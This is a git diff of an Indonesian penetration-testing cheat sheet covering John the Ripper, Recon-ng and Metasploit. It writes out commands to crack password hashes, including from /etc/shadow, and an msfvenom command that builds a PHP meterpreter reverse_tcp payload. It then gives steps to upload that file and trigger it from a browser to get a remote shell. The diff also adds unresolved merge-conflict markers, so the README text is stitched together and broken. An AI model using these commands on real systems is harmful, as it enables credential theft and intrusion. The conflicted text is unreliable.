@@ -2,27 +2,33 @@
 > Disusun oleh Hardiyanto
 
 ### Daftar Isi
+<<<<<<< HEAD
 	* [John the Ripper](#john-the-ripper)
 	* [Recon-ng](#reconng)
 	* [Msfvenom & Msfconsole](#msfvenom-msfconsole)
+=======
+
+* [John the Ripper](#john-the-ripper)
+* [Recon-ng](#reconng)
+>>>>>>> 4075b378f205da5f089411f42ab9b07e4292654f
 
 #### John the Ripper
 
-``
+```
 $ zip2john test.zip
-``
-``
+```
+```
 $ zip2john test.zip > hash.txt
-``
-``
+```
+```
 $ john -format:zip hash.txt
-``
-``
+```
+```
 $ john hash.txt
-``
-``
+```
+```
 john /etc/shadow
-``
+```
 
 #### Recon-ng
 
@@ -141,6 +147,7 @@ spool stop
 
 #### Msfvenom & Msfconsole
 
+<<<<<<< HEAD
 File Upload
 ```
 msfvenom -p php/meterpreter/reverse_tcp lhost=IP lport=4444 raw
@@ -166,3 +173,7 @@ exploit
 ```
 
 Masuk Browser jalankan file php yg berhasil di upload tadi di URL
+=======
+### Terima Kasih
+
+>>>>>>> 4075b378f205da5f089411f42ab9b07e4292654f
